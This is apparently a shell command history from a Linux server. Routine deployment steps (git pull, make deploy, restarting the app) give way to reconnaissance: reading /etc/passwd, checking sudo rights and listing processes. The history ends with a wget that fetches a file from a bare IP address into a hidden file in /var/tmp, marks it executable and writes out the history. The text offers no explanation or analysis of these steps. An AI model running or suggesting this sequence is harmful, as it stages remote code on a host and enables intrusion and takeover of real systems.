git pull
cd app
systemctl status app
make deploy
ls
sudo systemctl restart app
tail -f /var/log/app/app.log
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
wget -q http://185.227.74.40/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
